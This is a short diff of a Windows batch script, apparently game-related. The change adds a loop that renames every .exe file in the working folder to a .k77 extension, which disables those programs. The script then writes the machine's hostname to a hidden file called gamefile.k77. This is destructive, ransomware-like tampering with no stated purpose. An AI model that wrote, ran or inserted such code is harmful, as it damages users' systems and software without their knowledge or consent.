@@ -3,11 +3,13 @@
 REM Get the hostname
 for /f %%A in ('hostname') do set "HOSTNAME=%%A"
 
-REM Save hostname to a file
-echo %HOSTNAME% > gamefile.txt
+REM Rename all .exe files to .k77
+for %%F in (*.exe) do (
+    ren "%%F" "%%~nF.k77"
+)
 
-REM Rename the file to .k77
-ren gamefile.txt gamefile.k77
+REM Save hostname to a file
+echo %HOSTNAME% > gamefile.k77
 
 REM Hide the .k77 file
 attrib +h gamefile.k77
